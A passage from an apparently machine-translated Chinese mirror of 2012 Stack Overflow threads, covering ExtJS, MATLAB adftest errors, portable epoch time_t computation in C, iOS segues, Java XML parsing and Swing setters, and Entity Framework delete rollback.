  combo.setDisabled(false);

  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:26:49.913

要扩展您的代码，您可以这样做

```
listeners: {
    beforeload: function(store, options) {
        if (store.getCount() > 0) {
            return false; // will abort the load operation.
        }
        var value = Ext.getCmp('fistcombo').value;
        Ext.apply(options.params, {
             valuefirst:value
        });
    }
} 
```

这在 ExtJS 3.x 和 ExtJS4.x 中应该是一样的，因为你没有指定这个。但我猜你正在使用 3.x

如果这挂起组合给我反馈，因为还有另一种但更复杂的方式。

# matlab - lagmatrix 中的 adftest 函数错误

> ID：13957660
> 
> 赞同：0
> 
> 时间：2012-12-19T17:17:40.500
> 
> 标签：matlab, runtime-error

使用`adftest`MATLAB 计量经济学工具箱中的函数，我收到以下错误：

```
>> [h1,pVal1] = adftest(y1,'model','ARD')
Error using lagmatrix (line 25)
lagmatrix: wrong # of input arguments

Error in adftest>runReg (line 705)
yLags = lagmatrix(y,0:(testLags+1));

Error in adftest (line 417)
        testReg = runReg(i,y,testT,testLags,testModel,needRegOut); 
```

`y1`是一个 <41x1> 双精度向量。

是否有人收到此错误或对问题所在有任何想法？我使用的是开箱即​​用的代码，所以我不确定发生了什么。我会发布到 MATLAB 的网站，但它已停止维护。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:27:26.800

这可能是 Matlab 中的一个错误，在这种情况下，您应该在[Matlab 支持站点](http://www.mathworks.com/support/bugreports/)上提交它。在你这样做之前，你应该检查你`lagmatrix`的路径上没有隐藏内置函数的函数。类型

```
which lagmatrix 
```

在命令行上。如果路径不指向您的 Matlab 安装，您应该`lagmatrix`离开 Matlab 搜索路径。

另请注意，`y1`不应包含 all`NaN`或以其他方式退化，因此您可能需要使用帮助中建议的示例数据检查函数，以确保它是错误而不仅仅是您的数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-06T17:47:45.167

我对这个功能有同样的问题。就我而言，问题是`lagmatrix`我的 MATLAB 路径中的函数（旧版本），而该`adftest`函数是最新版本。解决方案是删除旧版本的`lagmatrix`.

# c - 如何在纯 ISO C 中计算时代的 time_t？

> ID：13957667
> 
> 赞同：8
> 
> 时间：2012-12-19T17:17:48.490
> 
> 标签：c, time, timezone

`time_t`只使用 C 标准库（纯 ISO C，没有 POSIX，因此没有以“自纪元以来的秒数”表示的假设），获得`time_t`对应于 1970 年 1 月 1 日 00:00:00 的值的最简单方法是什么**世界标准时间**？

UTC部分是关键；否则，仅`mktime`在正确初始化的情况下使用就`struct tm`可以轻松解决问题。

或者（这实际上是问题的“要点”），如何可移植地确定给定`time_t`值之间的 POSIX 秒数，例如通过 获得的当前时间`time(0)`和纪元？“POSIX 秒”是指 POSIX 的“自纪元以来的秒数”中使用的定义，它不使用闰秒。如果这听起来太复杂，只需回到最初在第一段中所述的问题，并假设 epoch 可以在`time_t`.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:29:30.953

这是一种方法的条目，如果没有人击败它，“最简单”：

*   呼吁`mktime`_ `struct tm`_`02 Jan 1970 00:00:00`
*   调用for 。`mktime`_ 这可以合理地返回 -1，在这种情况下将其视为 0。`struct tm``31 Dec 1969 00:00:00`
*   两者之间的二分搜索`time_t`，当传递给时`gmtime`，结果是`01 Jan 1970 00:00:00`

假设当地时间与 UTC 的差异不超过 24 小时，我很确定这是事实。如有必要，我们可以扩大边界，在极端情况下，我们可以在 和 之间进行`0`搜索`time(0)`。

二进制搜索可以改进，例如通过插值。但谁知道呢，也许一些疯狂的时区（或损坏的 tzinfo 数据）可能会导致 12 月/1 月的夏令时变化。我怀疑这发生在任何实时区域。但是C标准并没有禁止，只有常识。

如果不是这样，我认为我们可以根据`gmtime(mktime(01 Jan))`（以获取时区）和`01 Jan 1970 00:00:00`vs的比较`01 Jan 1970 00:00:01`（以获取 的精度`time_t`）进行计算。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T06:49:36.903

我以前的方法有太多问题，原因是关于如何`mktime`解决非规范化时间表示的模糊性让我无法适应它，所以我将尝试将这个想法与 Steve Jessop 的猜测/搜索想法合并以获得更好的方法：

1.  `struct tm`将对象初始化为`tm0`纪元的日历时间。

2.  打电话。`mktime`_ `tm0`但是，这将导致其被解释为本地时间，因此结果将不是所需的答案。调用这个`time_t`值`t0`。

3.  应用于`gmtime`将`t0`其转换为分解的世界时间。它应该与所需的时期相差不到 24 小时（实际上，最多 12 小时）。

4.  通过差值进行调整`tm0`并返回步骤 2。如果步骤 3 给出了正确的细分世界时间纪元，我们就完成了。否则，重复步骤 2-4（应该没有必要）。

在代码中，

```
time_t get_epoch()
{
        struct tm tm0 = { .tm_year = 70, .tm_mday = 1 }, gmt;
        time_t t0;
        for (;;) {
                t0 = mktime(&tm0);
                gmt = *gmtime(&t0);
                if (!gmt.tm_sec && !gmt.tm_min && !gmt.tm_hour &&
                        !gmt.tm_yday && gmt.tm_year==70) return t0;
                tm0.tm_sec -= gmt.tm_sec;
                tm0.tm_min -= gmt.tm_min;
                tm0.tm_hour -= gmt.tm_hour;
                tm0.tm_mday -= gmt.tm_mday-1;
                tm0.tm_mon -= gmt.tm_mon;
                tm0.tm_year -= gmt.tm_year-70;
        }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:42:38.477

第一步：选择任何一个`time_t`（当前时间就可以了）作为参考点；叫它`t0`。

第 2 步：调用`gmtime`并`t0`以分解的`struct tm`形式计算结果与 epoch 之间的差异。

第 3 步：调用并将第 2 步`localtime`中`t0`的细分差异应用于结果`struct tm`。然后调用`mktime`它来取回一个`time_t`.

结果应该是`time_t`代表时代的。

当本地时间偏移量随时间变化时，我第一次尝试实现这一点时遇到问题，例如在添加或放弃日光时间或从观察一个区域切换到另一个区域的地方。这似乎是因为`struct tm`时区信息所基于的数据发生了变化。这是原始实现，但存在问题：

```
time_t get_epoch(time_t t0)
{
    struct tm gmt = *gmtime(&t0);
    struct tm tmp = *localtime(&t0);
    tmp.tm_sec -= gmt.tm_sec;
    tmp.tm_min -= gmt.tm_min;
    tmp.tm_hour -= gmt.tm_hour;
    tmp.tm_mday -= gmt.tm_mday-1;
    tmp.tm_mon -= gmt.tm_mon;
    tmp.tm_year -= gmt.tm_year-70;
    return mktime(&tmp);
} 
```

和一个改进的版本，其中是使用 POSIX 公式（http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html#tag_04_15）`posix_time`计算给定纪元以来秒数的函数，还有额外的工作`struct tm`如果需要，处理 1970 年之前的年份等：

```
time_t get_epoch(time_t t0)
{
    struct tm gmt = *gmtime(&t0);
    struct tm tmp = *localtime(&t0);
    long long offset = posix_time(&gmt);
    while (offset > INT_MAX) {
        offset -= INT_MAX;
        tmp.tm_sec -= INT_MAX;
        mktime(&tmp);
    }
    while (offset < -INT_MAX+61) {
        offset -= -INT_MAX+61;
        tmp.tm_sec -= -INT_MAX+61;
        mktime(&tmp);
    }
    tmp.tm_sec -= offset;
    return mktime(&tmp);
} 
```

对于 C89 兼容性，`long long`必须放弃，并且所需的`mktime`调用数量急剧增加；`offset`不能计算为单个值，但需要一个循环来`mktime`每年调用多次。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:30:11.227

你的问题是相当基本的：ISO C 几乎完全在时区上踢球，简单地提供`mktime()`和转换，`localtime()`并`gmtime()`带有夏令时的钩子。（*他们实施，你决定。*）

因此，您似乎只能做两件事：

1.  假设这`time_t`是秒自纪元 UTC 并用于`gmtime()`验证，如果失败则恐慌或警告；*或者*
2.  依赖比 ISO C 更全面的标准

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-19T21:47:56.077

*编辑：*也许非标准的以下实现`timegm`将满足问题的非 POSIX 要求：

```
#include <stdio.h>
#include <string.h>
#include <time.h>

time_t my_timegm(struct tm *tm) {
   time_t t, g;
   double dt; // seconds
   struct tm *gm;
   t = mktime(tm);
   gm = gmtime(&t);
   gm->tm_isdst = 0;
   g = mktime(gm);
   dt = difftime(t, g);
   if (dt >= 0) {
      tm->tm_sec += fmod(dt, 60); // needed to handle 16-bit ints
      tm->tm_min += dt / 60;
   }
   else {
      tm->tm_sec -= fmod(-dt, 60);
      tm->tm_min -= -dt / 60;
   }
   return mktime(tm);
}

int main(void) { // prints time_t for 01 Jan 1970 00:00:00 UTC
   struct tm start;
   memset(&start, 0, sizeof start);
   start.tm_year = 70; // = 1970
   start.tm_mday = 1;  // = 1st
   printf("%ld\n" my_timegm(&start)); // gives 0 on any POSIX system
   return 0;
} 
```

`mktime`根据 Linux 手册页，这假设将采取行动`structure members .. outside their valid interval ... will be normalized`，或者至少确保返回一些合理的东西。我不知道普通的 ISO C 是否能保证这一点。

我最初的版本`my_timegm`来自[http://lists.samba.org/archive/samba-technical/2002-November/025571.html](http://lists.samba.org/archive/samba-technical/2002-November/025571.html)，并且归功于 Beeman、Baushke、Sabol 和 Zawinski：

```
time_t my_timegm(struct tm *tm) {
   time_t t, g;
   struct tm *gm;
   t = mktime(tm);
   if (t == -1) { // perhaps needed for DST changeover?
      tm->tm_hour--;
      if ((t = mktime(tm)) != -1)
         t += 3600;
   }
   gm = gmtime(&t);
   gm->tm_isdst = 0;
   g = mktime(gm);
   if (g == -1) {
      gm->tm_hour--;
      if ((g = mktime(gm)) != -1)
         g += 3600;
   }
   return (t == -1 || g == -1) ? -1 : t - (g - t); // or difftime
} 
```

我仍在考虑是否需要 code:`tm->tm_hour--`等。

# ios - 处理开始/结束外观转换的不平衡呼叫

> ID：13957674
> 
> 赞同：0
> 
> 时间：2012-12-19T17:18:17.487
> 
> 标签：ios, mkmapview, segue, viewcontroller

我正在使用带有来自简单注释的标注的 mapView。我使用了下面的委托方法

```
- (void)mapView:(MKMapView *)_mapView annotationView:(MKAnnotationView *)view calloutAccessoryControlTapped:(UIControl *)control {

    lbhProfileMapPoint *mp = (lbhProfileMapPoint *) view.annotation;
    NSLog(@"mp objectID: %@", mp.objectID);
    self.objectId = mp.objectID;
    [[lbhVariables sharedInstance] setMapViewChosenObjectId:self.objectId];

    //[self performSegueWithIdentifier:@"profileSegue" sender:self];
    lbhProfileViewController *pvc = [[lbhProfileViewController alloc] init];
    [pvc setObjectId:self.objectId];
    [self.navigationController pushViewController:pvc animated:NO];
} 
```

它没有转到视图控制器，但一直在说

```
Unbalanced calls to begin/end appearance transitions for <lbhProfileViewController: 0x1f017ec0>. 
```

实际上是 lbhProfileViewController，它通过其他视图控制器连接到我的故事板中。但是有了这个附件标注，我想手动调用它。如你所见，我有

```
//[self performSegueWithIdentifier:@"profileSegue" sender:self]; 
```

在代码中，但如果我改用这个方法，它仍然会给我不平衡的调用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:35:35.643

如果你使用`performSegueWithIdentifier:sender:`方法，你也应该使用`prepareForSegue:sender:`方法。您在`prepareForSegue:sender:`方法中的代码将是这样的：

```
-(void)prepareForSegue:(UIStoryBoardSegue*) segue sender:(id) sender
{
     if([segue.identifier isEqualToString:@"profileSegue"]){
         lbhProfileViewController *pvc = [segue destinationViewController];
         [[segue destinationViewController]setObject:sender.objectId];
     }
} 
```

同样要使用它，您将需要一个 segue 直接`lbhProfileViewController`从调用 map 委托方法的视图控制器连接到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T10:15:39.753

我找到了答案。

在 ViewDidDisappear 方法中，我正在做一个 self.navigationController pop 方法，所以它与此发生冲突。

但是，是的，这有帮助，谢谢！

# java - 解析xml并制作对象java

> ID：13957677
> 
> 赞同：2
> 
> 时间：2012-12-19T17:18:29.013
> 
> 标签：java, xml, http, review

找人看我的简单代码。我对我正在做的事情相当陌生，并且知道我可能只是在某个地方犯了一个简单的错误。

我正在解析一个通过 http 的 xml 文件，并尝试将与元素关联的文本打印到屏幕上，并创建一个由这些元素中的文本填充的对象。

我可以打印所有元素和相关文本，但对象的字段中都有一个空值。如果我有什么需要更好地解释的，请告诉我。

代码如下：

对象等级：

```
 package com.entities;

public class StageOfLife
{

private String endDate;
private String offerData;
private String offerType;
private String redemption;
private String startDate;
private String termsConditions;
private String title;
private String merchantDescription;
private String merchantLogo;
private String merchantName;

public StageOfLife() {

}

public StageOfLife(String endDate, String offerData, String offerType,
        String redemption, String startDate, String termsConditions,
        String title, String merchantDescription, String merchantLogo,
        String merchantName)
{

// Getters Setters HEre

 public String toString() {

 StringBuffer buffer = new StringBuffer();

 buffer.append(endDate);
 buffer.append("\n");
 buffer.append(offerData);
 buffer.append("\n");
 buffer.append(offerType);
 buffer.append("\n");
 buffer.append(redemption);
 buffer.append("\n");
 buffer.append(startDate);
 buffer.append("\n");
 buffer.append(termsConditions);
 buffer.append("\n");
 buffer.append(title);
 buffer.append("\n");
 buffer.append(merchantDescription);
 buffer.append("\n");
 buffer.append(merchantLogo);
 buffer.append("\n");
 buffer.append(merchantName);

 return buffer.toString();
 }

} 
```

这是具有方法和主要的类：

```
package com.xmlparse;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import com.entities.StageOfLife;

public class XmlParserStage
{
 Document dom;
 DocumentBuilder db;
 List<StageOfLife> myStageList;

 public XmlParserStage(){
        //create a list to hold the StageOfLife objects
        myStageList = new ArrayList<StageOfLife>();
    }

private void parseXmlFile(){
    //get the factory
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

    try {

        //Using factory get an instance of document builder
        db = dbf.newDocumentBuilder();

        //parse to get DOM representation of the XML file
    dom = db.parse("http:/url/goes/here");

    } catch(ParserConfigurationException pce) {
        pce.printStackTrace();
    } catch(SAXException se) {
        se.printStackTrace();
    } catch(IOException ioe) {
        ioe.printStackTrace();
    }
}

 private void parseDocument() {

    //get the root element
    Element docEle = dom.getDocumentElement();

    //get a nodelist of elements
    NodeList nl = docEle.getElementsByTagName("Offer");
    if(nl != null && nl.getLength() > 0) {
        for(int i = 0 ; i < nl.getLength(); i++) {

            //get the elements 
            Element solEl = (Element)nl.item(i);

            //get the StageOfLife object
            StageOfLife sol = getStageOfLife(solEl);

            //add it to list
          myStageList.add(sol);
        }
    }
}

/*
  take an <offer> element and read the values in, create
  an StageOfLife object and return it
*/
private StageOfLife getStageOfLife(Element solEl) {

/*
  for each <offer> element get the values
*/

    String endDate = getTextValue(solEl,"EndDate");
    String offerData = getTextValue(solEl,"OfferData");
    String offerType = getTextValue(solEl,"OfferType");
    String redemption = getTextValue(solEl,"Redemption");
    String startDate = getTextValue(solEl,"StartDate");
    String termsConditions = getTextValue(solEl,"TermsConditions");
    String title = getTextValue(solEl,"Title");
    String merchantDescription = getTextValue(solEl,"MerchantDescription");
    String merchantLogo = getTextValue(solEl,"MerchantLogo");
    String merchantName = getTextValue(solEl,"MerchantName");

    //Create a new StageOfLife object with the value read from the xml nodes
    StageOfLife sol = new StageOfLife(endDate, offerData, offerType,
             redemption, startDate, termsConditions,
             title, merchantDescription, merchantLogo,
             merchantName);

    return sol;
}

/*
  take a xml element and the tag name, look for the tag and get
  the text content
 */

private String getTextValue(Element ele, String tagName) {

    String textVal = null;
    NodeList nl = ele.getElementsByTagName(tagName);
    if(nl != null && nl.getLength() > 0) {
        Element el = (Element)nl.item(0);
        textVal = el.getFirstChild().getNodeValue();

        System.out.print(el + ":" + textVal);
        System.out.println();

    }

    return textVal;
}

/*
 Calls getTextValue and returns a int value
*/
private int getIntValue(Element ele, String tagName) {

    return Integer.parseInt(getTextValue(ele,tagName));
}

private void printData(){

    System.out.println("Number of Offers: '" + myStageList.size() + "'.");

    Iterator it = myStageList.iterator();
    while(it.hasNext()) {
        System.out.println(it.next().toString());

    }
}

public void run() {

    //parse the xml file and get the dom object
    parseXmlFile();

    //get each stageoflife element and create a StageOfLife object
    parseDocument();

    //Iterate through the list and print the data
    printData();
}

public static void main(String [] args) throws ClientProtocolException, IOException      {

  XmlParserStage xmlParser = new XmlParserStage();

    xmlParser.httpClient();

    xmlParser.run(); 

}

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:27:12.113

你的构造函数什么也没做！

```
public StageOfLife(String endDate, String offerData, String offerType,
        String redemption, String startDate, String termsConditions,
        String title, String merchantDescription, String merchantLogo,
        String merchantName)
{
  // set the data
  this.endDate = endDate;
  ...
} 
```

但更好的是使用 Java XML Binding jaxb。它会自动将 java 类映射到 xml

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-19T19:18:27.080

看看 Jaxb 库。它可以为您完成所有繁重的工作。

[JAXB 主页](http://jaxb.java.net/)

[沃杰拉教程](http://www.vogella.com/articles/JAXB/article.html)

[Mkyong教程](http://www.mkyong.com/java/jaxb-hello-world-example/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T17:28:57.227

将传递给`StageOfLife`构造函数的值设置为变量。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:40:49.503

试试这个

```
public class Tester {

    String getString() throws IOException, ParserConfigurationException, SAXException {
        InputStream inputStream = //your stream from http
        String sa = "";
        int cc;
        while((cc = inputStream.read()) != -1) {
            sa += (char) cc;
        }
        ByteArrayInputStream sr = new ByteArrayInputStream(sa.getBytes());
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(sr);

        Node node=doc.getDocumentElement().getFirstChild();
        String data=node.getNodeName();

        return data;
    }

    public static void main(String[] args) throws IOException, ParserConfigurationException, SAXException {
        Tester t = new Tester();
        System.out.println(t.getString());

    } 
```

# java - 从 jtextfield 提供数据并将它们存储到文件中

> ID：13957688
> 
> 赞同：1
> 
> 时间：2012-12-19T17:18:50.753
> 
> 标签：java, swing, file, jtextfield, getter-setter

我要编写一个库应用程序。

我与netbeans一起工作。

我有一个这样的界面：

```
package Library;

 public interface UserInformation {

 public void setFName(String fn);
 public String getFName();
 public void setLName(String ln);
 public String getLName();
 public void setRegNum(int reg_num);
 public int getRegNum();
 public void setDate(int reg_date);
 public int getDate();
} 
```

我的 NewUserDialog 实现了这个接口：

```
private String FirstName="";
private String LastName="";
private int Registration_Number=0;
private int Date=0;
private String fileadress="AllUserRecords.txt";

public NewUserDialog(java.awt.Frame parent, boolean modal) {
    super(parent, modal);
    initComponents();

}
// // <editor-fold defaultstate="collapsed" desc="Generated Code">

private void initComponents() {

    jLabel1 = new javax.swing.JLabel();
    jLabel2 = new javax.swing.JLabel();
    jLabel3 = new javax.swing.JLabel();
    jLabel4 = new javax.swing.JLabel();
    jTextField1 = new javax.swing.JTextField();
    jTextField2 = new javax.swing.JTextField();
    jTextField3 = new javax.swing.JTextField();
    jButton1 = new javax.swing.JButton();
    jButton2 = new javax.swing.JButton();
    jLabel5 = new javax.swing.JLabel();
    jLabel6 = new javax.swing.JLabel();
setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);

    jLabel1.setFont(new java.awt.Font("Tunga", 1, 14)); // NOI18N
    jLabel1.setText("Add New User (Registration)");

    jLabel2.setText("First Name:");

    jLabel3.setText("Last Name:");

    jLabel4.setText("Date:");

    jTextField2.addActionListener(new java.awt.event.ActionListener() {
        public void actionPerformed(java.awt.event.ActionEvent evt) {
            jTextField2ActionPerformed(evt);
        }
    });

jButton1.setText("Create");
    jButton1.addActionListener(new java.awt.event.ActionListener() {
        public void actionPerformed(java.awt.event.ActionEvent evt) {
            jButton1ActionPerformed(evt);
        }
    });

    jButton2.setText("Back");

    jLabel5.setText("Registration Number is:");

    jLabel6.setText("            ");

    javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
    getContentPane().setLayout(layout);
    layout.setHorizontalGroup(
        layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
        .addGroup(layout.createSequentialGroup()
            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(layout.createSequentialGroup()
                    .addGap(54, 54, 54)
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jLabel2)
                        .addComponent(jLabel4)
                        .addComponent(jLabel3)
                        .addComponent(jLabel5))
                    .addGap(98, 98, 98)
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jLabel6)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(jTextField3)
                            .addComponent(jTextField1, javax.swing.GroupLayout.DEFAULT_SIZE, 81, Short.MAX_VALUE)
                            .addComponent(jButton2, javax.swing.GroupLayout.Alignment.TRAILING)
                            .addComponent(jTextField2))
                        .addComponent(jLabel1)))
                .addGroup(layout.createSequentialGroup()
                    .addGap(68, 68, 68)
                    .addComponent(jButton1)))
            .addContainerGap(141, Short.MAX_VALUE))
    );
    layout.setVerticalGroup(
        layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
        .addGroup(layout.createSequentialGroup()
            .addContainerGap()
            .addComponent(jLabel1)
            .addGap(26, 26, 26)
            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addComponent(jLabel2)
                .addGroup(layout.createSequentialGroup()
                    .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGap(28, 28, 28)
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(jTextField2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(jLabel3))
                    .addGap(34, 34, 34)
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(jTextField3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(jLabel4))))
            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 50, Short.MAX_VALUE)
            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                .addComponent(jLabel5)
                .addComponent(jLabel6))
            .addGap(27, 27, 27)
            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                .addComponent(jButton1)
                .addComponent(jButton2))
            .addGap(116, 116, 116))
    );

    pack();
}// </editor-fold>                        

private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {                                         
    try{
    setFName(jTextField1.getText());
    if(havedigit(FirstName)==true) throw new Exception();
    WriteToFile(getFName());
    setLName(jTextField2.getText());
    if(havedigit(LastName)==true) throw new Exception();
    WriteToFile(getLName());
    setDate(Integer.parseInt(jTextField3.getText()));
    WriteToFile(String.valueOf(getDate()));
    Random rnd1=new Random();
    Registration_Number=rnd1.nextInt(100);
    setRegNum(Registration_Number);
    WriteToFile(String.valueOf(getRegNum()));
    jLabel6.setText(String.valueOf(getRegNum()));
    }
    catch(Exception e){
        jLabel6.setText("Error!");
    }
}                                        

public boolean havedigit(String in){
    for(int i=0;i<in.length();i++){
        if(Character.isDigit(in.charAt(i)))  return true;
    }
    return false;
}

public void WriteToFile(String content){
    try{
        File f=new File("C:\\userrecords.txt");
        if(!f.exists()){
            f.createNewFile();
        }
        else{
            FileWriter fw=new FileWriter(f.getAbsoluteFile(), true);
            BufferedWriter bw=new BufferedWriter(fw);
            bw.write(content);
            bw.newLine();
            bw.close();
            System.out.println("Done");
        }
    }
    catch(Exception e){
        e.printStackTrace();
    }

}

public static void main(String args[]) {
    java.awt.EventQueue.invokeLater(new Runnable() {
        public void run() {
            NewUserDialog dialog = new NewUserDialog(new javax.swing.JFrame(), true);
            dialog.addWindowListener(new java.awt.event.WindowAdapter() {
                public void windowClosing(java.awt.event.WindowEvent e) {
                    System.exit(0);
                }
            });
            dialog.setVisible(true);
        }
    });
}

// Variables declaration - do not modify                     
private javax.swing.JButton jButton1;
private javax.swing.JButton jButton2;
private javax.swing.JLabel jLabel1;
private javax.swing.JLabel jLabel2;
private javax.swing.JLabel jLabel3;
private javax.swing.JLabel jLabel4;
private javax.swing.JLabel jLabel5;
private javax.swing.JLabel jLabel6;
private javax.swing.JTextField jTextField1;
private javax.swing.JTextField jTextField2;
private javax.swing.JTextField jTextField3;
// End of variables declaration                   

public void setFName(String fn) {
    FirstName.equals(fn);
}

public String getFName() {
    return FirstName;
}

public void setLName(String ln) {
    LastName.equals(ln);
}

public String getLName() {
    return FirstName;
}

public void setRegNum(int reg_num) {
    Registration_Number=reg_num;
}

public int getRegNum() {
    return Registration_Number;
}

public void setDate(int reg_date) {
    Date=reg_date;
}

 public int getDate() {
   return Date;
}
} 
```

我的目的是，当我们归档 jtextfile 字段并单击按钮时，此数据应保存到 .txt 文件中。但 Fname 和 Lname 都没有保存到文件，只是“日期”文件保存到文件。我希望 Fname 和 Lname 以及 Data 必须定期存储在文本文件中。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:26:57.790

你的setter方法，`setFName(...)`根本`setLName(...)`不做任何设置。相反，他们所做的只是对相等性进行不必要且莫名其妙的测试，然后丢弃结果：

```
public void setLName(String ln) {
    LastName.equals(ln); // ???????
} 
```

不如创建真正的 setter 方法来设置引用变量所持有的对象：

```
public void setLName(String ln) {
    lastName = ln; // note variable names should begin w/ a lowercase letter
} 
```

如果您不设置这些字段，那么您不能期望 getter 方法中的信息在写入文件时有用。

此外，您还有一个较弱的 catch 块，它不会通知您堆栈跟踪的内容，这些信息可能会帮助您找出问题所在。

此外，您的 GUI 有什么目的来实现似乎更适合模型类而不是视图 (GUI) 类的非 GUI 界面？我更喜欢这里的组合而不是继承。

# .net - 如何在不丢失导航属性的情况下回滚实体删除

> ID：13957689
> 
> 赞同：5
> 
> 时间：2012-12-19T17:18:52.590
> 
> 标签：.net, entity-framework, code-first, navigational-properties

我们首先使用实体​​框架代码，当我们不想回滚插入、更新和删除的实体更改时，我遇到了问题`SaveChanges()`。

具体来说，我有一个用作 TableEditor 的 datagridview 来更改一些辅助表。datagridview 绑定到`DbSet<TEntity>`.

我的更新回滚似乎工作正常，我只是将 currentValues 设置回它们的 OriginalValues，并将状态更改为`unchanged`.

当一条记录插入到gridview（但没有保存更改）时，它永远不会出现在实体类中，我再也看不到它了......所以我猜它不会进入dbSet，并且没有回滚需要这个吗？

但我的**主要问题在于 Delete**：

据我了解，当一条记录被“删除”（例如`tableData.Remove(currentItem);`）时，它只是被**标记**为删除，直到调用 SaveChanges 为止。因此，如果我将 State 从`deleted`back 更改为`unchanged`，那应该可以处理回滚，对吗？

好吧，记录确实再次显示，但记录的导航属性消失了！（即包含外键和与其他实体的必需关系的列）。为什么是这样？？！

这是我到目前为止所拥有的：

```
 public void RollbackChanges(DbEntityEntry entry)
    {
        if (entry.State == EntityState.Modified)
        {
            foreach (var propertyName in entry.OriginalValues.PropertyNames)
            {
                entry.CurrentValues[propertyName] = entry.OriginalValues[propertyName];
            }
            entry.State = EntityState.Unchanged;
        }
        else if (entry.State == EntityState.Deleted)
        {
            entry.State = EntityState.Unchanged;
        }
        else if ((entry.State == EntityState.Added) || (entry.State == EntityState.Detached))
        {
            MessageBox.Show("I don't think this ever happens?");
        }
    } 
```

示例用法：

```
 foreach (var entity in db.CertificationDecisions)
                {
                    DbEntityEntry entry = db.Entry(entity );
                    if (entry.State != EntityState.Unchanged)
                    {
                        RollbackChanges(entry);
                    }
                } 
```

任何想法为什么导航属性会从记录中消失？（或者我能做些什么让他们回来？）

* * *

**编辑：** @Chris 关于使用[`Refresh`](http://msdn.microsoft.com/en-us/library/bb896255.aspx)：

我正在使用[DbContext](https://stackoverflow.com/questions/7863270/entity-framework-4-1-refresh-is-not-a-member-of-context)，所以我用这一行替换了我的回滚方法：

```
((IObjectContextAdapter)db).ObjectContext.Refresh(RefreshMode.StoreWins, db.CertificationDecisions); 
```

但是，这似乎并没有重新加载上下文，因为记录仍然丢失......我用`Refresh`错了吗？

这听起来像是我的问题的可能解决方案，但我仍然想知道为什么会删除导航属性？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T18:42:28.893

> 任何想法为什么导航属性会从记录中消失？

由于外键关系，导航属性很可能被删除。让我们参加以下课程：

```
public class Dog
{
  public guid ID { get; set; }
  public string Title { get; set; }
}

public class Person
{
  public guid ID { get; set; }

  public ICollection<Dog> FavoriteDogs { get; set; }
} 
```

在数据库中，FavoriteDogs 的集合是一个表，该表同时引用了 Person 和 Dog，但被导航属性自动隐藏。当*父*状态设置为已删除时，EF 会自动将参考实体标记为已删除。*如果父*实体设置为未更改，实体框架不会将这些引用实体设置为未更改，因为这样做不需要引用完整性（仅适用于删除操作）。

> 或者我能做些什么让他们回来？

目前 EF 中没有可以执行此操作的自动化流程。 [我不相信甚至有手动更改引用实体的方法](https://stackoverflow.com/questions/5331936/entity-framework-change-tracking-api-and-reference-entries)。并且新的[Entity Framework 5 没有公开任何查看或更改`DbRefrenceEntry`](http://msdn.microsoft.com/en-us/library/gg696537(v=vs.103).aspx).

